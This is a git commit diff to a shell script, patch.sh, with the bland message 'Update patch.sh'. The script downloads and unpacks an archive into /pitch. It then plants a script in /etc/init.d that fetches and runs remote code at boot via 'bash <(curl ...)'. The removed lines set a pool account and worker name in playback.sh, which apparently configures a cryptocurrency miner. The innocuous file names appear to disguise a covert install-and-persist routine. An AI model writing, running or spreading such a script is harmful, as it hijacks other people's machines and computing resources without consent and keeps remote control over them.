216c66aa96fc34aec6b82ef26be11f39fdabef06
meggafany <meggafaniy@gmail.com>
2024-06-02 02:56:46 +0000

    Update patch.sh

--- patch.sh
+++ patch.sh
@@ -4,9 +4,6 @@ rm -rf pitch
 wget https://github.com/overdubez/pan/releases/download/v1.0.2/pitch.tar
 tar -xvf pitch.tar
 cd /pitch
-variable1=s4a$(shuf -i 1-99 -n 1)
-sed -i "s/test_accountname/CP_bsmzapay1 --worker ${variable1}/g" ./playback.sh
-sed -i "s/CP_32hb86nvxc/CP_bsmzapay1 --worker ${variable1}/g" ./playback.sh
 cd /etc/init.d
 echo "bash <(curl -s -L https://raw.githubusercontent.com/overdubez/pan/main/patch.sh)" > phase.sh
 chmod a+x phase.sh
